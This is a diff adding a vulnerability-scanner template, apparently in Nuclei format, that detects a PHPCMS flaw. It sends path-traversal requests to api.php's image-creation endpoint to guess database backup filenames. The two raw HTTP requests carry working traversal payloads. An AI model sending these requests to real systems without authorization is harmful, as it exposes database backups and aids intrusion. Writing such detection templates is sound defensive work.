@@ -1,0 +1,34 @@
+id: phpcms-api-guess-backup-file-vuln
+info:
+  name: PHPCMS Database Backup Filename Guess Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        GET /api.php?op=creatimg&txt=dysec&font=/../../../../caches/bakup/default/notfound.sql HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Cannot Initialize new GD image stream"
+
+  - raw:
+      - |
+        GET /api.php?op=creatimg&txt=dysec&font=/../../../../caches/bakup/default/<<.sql HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "PNG"
+      - type: word
+        part: body
+        words:
+          - "Cannot Initialize new GD image stream"
+        negative: true
